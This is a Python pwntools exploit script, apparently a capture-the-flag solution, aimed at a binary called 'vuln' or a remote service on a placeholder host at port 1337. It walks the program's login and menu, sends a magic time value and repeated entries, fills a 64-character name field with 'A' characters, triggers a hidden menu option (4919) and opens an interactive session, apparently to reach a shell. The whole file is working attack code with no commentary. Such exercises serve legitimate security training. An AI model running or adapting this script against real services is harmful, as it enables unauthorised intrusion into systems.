from pwn import *

exe = ELF("vuln")

context.binary = exe
# context.log_level = 'DEBUG'

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            util.proc.wait_for_debugger(util.proc.pidof(r)[0])
    else:
        r = remote("rua_host_goes_here", 1337)
    return r

io = start()

io.sendlineafter(b"Please login: \n",b"1")
io.sendlineafter(b"name (max 64 character): \n",b"a")
io.sendlineafter(b"> ","2")
io.sendlineafter(b"please enter current time: ",b"51966")
for i in range(15):
    io.sendlineafter(b"> ","3")
    io.sendlineafter(b"name (max 64 character): \n",b"a")
io.sendlineafter(b"> ","3")
io.sendlineafter(b"name (max 64 character): \n",b"A"*64)
io.sendlineafter(b"> ","4919")
io.interactive()